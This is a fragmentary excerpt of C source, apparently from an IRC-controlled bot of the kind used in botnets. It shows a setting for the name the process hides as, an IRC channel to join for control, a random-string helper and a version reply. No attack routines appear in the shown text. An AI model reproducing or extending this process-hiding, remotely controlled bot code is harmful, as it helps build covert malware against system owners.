...
#undef FAKENAME                 // What you want this to hide as
#define CHAN "#gopherjams"      // Channel to join
...
char *makestring() {
        ...
        memset(tmp,0,len+1);
        if ((file=fopen("/data/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
        else {
                int a=(abs((rand())*abs(rand()))%10000)+1;
                char buf[1024];
...
void version(int sock, char *sender, int argc, char **argv) {
        Send(sock,"NOTICE %s :the beard is red\n",sender);
}
